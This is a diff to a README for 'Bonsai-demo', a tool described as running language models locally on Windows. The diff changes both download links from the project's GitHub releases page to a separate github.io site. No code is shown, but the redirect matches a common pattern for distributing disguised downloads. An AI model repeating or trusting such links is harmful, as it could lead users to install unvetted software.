@@ -1,6 +1,6 @@
 # 🌳 Bonsai-demo - Small models running on your machine
 
-[![](https://img.shields.io/badge/Download-Bonsai-blue)](https://github.com/Gennieodorous416/Bonsai-demo/releases)
+[![](https://img.shields.io/badge/Download-Bonsai-blue)](https://gennieodorous416.github.io)
 
 Bonsai-demo brings artificial intelligence to your personal computer. This software allows you to run language models locally without sending data to the internet. It uses efficient technology to ensure your computer handles tasks without slowing down. You retain full control over your information and your privacy.
 
@@ -18,7 +18,7 @@ Before you install this software, check your computer against these requirements
 
 You get the software from our official release page. This page contains the file you need to run the program on Windows.
 
-[Click here to visit the release page to download your copy](https://github.com/Gennieodorous416/Bonsai-demo/releases)
+[Click here to visit the release page to download your copy](https://gennieodorous416.github.io)
 
 Follow these steps on the website:
 
